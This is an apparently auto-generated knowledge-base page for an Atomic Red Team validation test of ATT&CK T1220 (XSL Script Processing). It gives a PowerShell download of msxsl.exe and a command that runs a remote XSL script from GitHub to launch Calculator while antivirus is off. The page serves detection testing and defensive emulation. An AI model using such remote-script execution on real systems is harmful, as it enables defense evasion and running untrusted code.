---
atomic_guid: "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985"
title: "MSXSL Bypass using remote files"
framework: "atomic"
generated: "true"
attack_technique_id: "T1220"
attack_technique_name: "XSL Script Processing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985"
  - "MSXSL Bypass using remote files"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# MSXSL Bypass using remote files

Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
Requires download of MSXSL.exe. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
Open Calculator.exe when test successfully executed, while AV turned off.

## Metadata

- Atomic GUID: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
- Technique: T1220: XSL Script Processing
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1220/T1220.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1220-xsl_script_processing|T1220]]

## Input Arguments

### msxsl_exe

- description: Location of the MSXSL executable.
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe

### xmlfile

- description: Remote location (URL) of the test XML file.
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml

### xslfile

- description: Remote location (URL) of the test XSL script file.
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl

## Dependencies

msxsl.exe must exist on disk at specified location ("#{msxsl_exe}")

### Prerequisite Check

```powershell
if (Test-Path "#{msxsl_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
```

## Executor

- name: command_prompt

### Command

```cmd
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
```

### Cleanup

```cmd
del -Path #{msxsl_exe} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml)
